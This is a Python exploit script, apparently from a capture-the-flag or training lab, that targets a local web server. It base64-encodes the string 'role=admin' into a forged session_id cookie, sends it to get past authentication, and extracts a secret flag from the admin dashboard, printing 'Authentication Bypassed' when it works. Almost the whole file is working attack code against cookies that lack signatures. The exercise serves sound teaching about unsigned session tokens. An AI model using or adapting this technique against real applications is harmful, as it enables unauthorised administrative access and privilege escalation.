import requests
import base64
import sys

TARGET_URL = "http://127.0.0.1:5050"

print("\033[96m[*] Initializing Session Hijacker Engine...\033[0m")

# 1. Forge the payload
# We know the server's weak logic expects exactly this string to grant admin rights.
payload = "role=admin"
print(f"[*] Target payload identified: {payload}")

# 2. Exploit the lack of cryptographic signing
# We encode our forged payload into the exact format the server blindly trusts.
forged_token = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
print(f"\033[93m[+] Forged Session Token generated: {forged_token}\033[0m")

# 3. Inject the forged token
print("[*] Injecting forged token into target server headers...")
cookies = {'session_id': forged_token}

try:
    # We send a standard GET request, but we swap the wristband.
    response = requests.get(TARGET_URL, cookies=cookies)
except Exception as e:
    print(f"[-] Connection failed: {e}")
    sys.exit()

# 4. Verify the breach
if "Admin Dashboard" in response.text:
    print("\n\033[92m[+] CRITICAL SUCCESS: Authentication Bypassed.\033[0m")
    print("\033[92m[+] Admin Dashboard Hijacked.\033[0m\n")
    
    # Extract the hidden flag from the server response
    for line in response.text.split('</p>'):
        if "Secret Flag:" in line:
            clean_flag = line.replace('<p>', '').strip()
            print(f"\033[91m[!] {clean_flag}\033[0m")
else:
    print("[-] Exploit failed. The server did not accept the forged token.")